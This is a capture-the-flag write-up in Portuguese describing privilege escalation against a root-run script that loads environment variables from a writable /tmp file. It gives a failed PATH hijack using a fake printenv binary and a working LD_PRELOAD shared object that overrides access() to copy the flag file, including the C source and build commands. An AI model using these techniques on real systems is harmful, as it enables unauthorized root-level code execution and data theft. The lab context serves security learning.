# Explorando a Modificação de Variáveis de Ambiente

Na nossa análise inicial, começámos por examinar as permissões de todos os diretórios e ficheiros. Após uma investigação minuciosa, descobrimos que na pasta **tmp** tínhamos permissões de escrita, leitura e execução de ficheiros. Com este conhecimento e considerando que não existia nenhum ficheiro pertencente ao utilizador root na pasta **tmp**, tivemos de conceber uma forma de modificar as variáveis de ambiente.

Por fim, percebemos que o ficheiro **env** na pasta home era uma referência para um **env** que existisse na pasta **tmp**. Com esta informação, procedemos à criação de um ficheiro **env** na pasta **tmp**. Este seria utilizado para definir as variáveis de ambiente do utilizador root. Para tal, aproveitámos o facto de o script.sh ser executado constantemente no servidor e de conter a seguinte linha:

```bash
export $(/usr/bin/cat /home/flag_reader/env | /usr/bin/xargs)
```

Assim, bastava-nos aguardar que o script.sh fosse executado novamente para que as variáveis que tínhamos colocado no env fossem aplicadas.

Dado que tínhamos a capacidade de modificar as variáveis de ambiente, a nossa primeira tentativa foi definir **PATH=/tmp:$PATH**. Com a variável PATH modificada, tentámos criar um ficheiro **printenv.o** com base no seguinte código **printenv.c**:

```c
#include <unistd.h>
int main(int argc, char *argv[]) {
	system("cat /flags/flag.txt > /tmp/something.txt");
	return 0;
}
```

Ajustámos também as permissões de todos estes ficheiros usando o comando **chmod 777 "nome_do_ficheiro"** para garantir que tinham permissões de leitura, escrita e execução. Deste modo, quando o script.sh fosse executado e o comando **printenv** fosse invocado, em vez de recorrer ao caminho padrão, iria para o que tínhamos criado na pasta tmp, dado que esta estava no início do PATH do utilizador root, como já referido anteriormente. Infelizmente, esta solução não nos trouxe a flag.

Além desta solução, era também possível redefinir a função **access()** que estava a ser constantemente usada pelo executável **reader** no **script.sh**. Para este processo, era necessário executar os seguintes comandos pela seguinte ordem:

### 1. Criar o ficheiro **p.c**:

```c
#include <unistd.h>
extern int access(const char* path, int amode) {
	system("cat /flags/flag.txt > /tmp/something.txt"); 
	return 0;
}
```

### 2. Colocá-lo no ficheiro **env**:

```bash
echo "LD_PRELOAD=./p.so" > env
```

### 3. Compilar o objeto partilhado:

```bash
gcc -fPIC -g -c p.c
gcc -shared -o p.so p.o -lc
chmod 777 p.c p.o p.so env
```

Esta sequência de passos permitiu-nos redefinir o comportamento da função **access()**, o que nos levou a alcançar o nosso objetivo final.
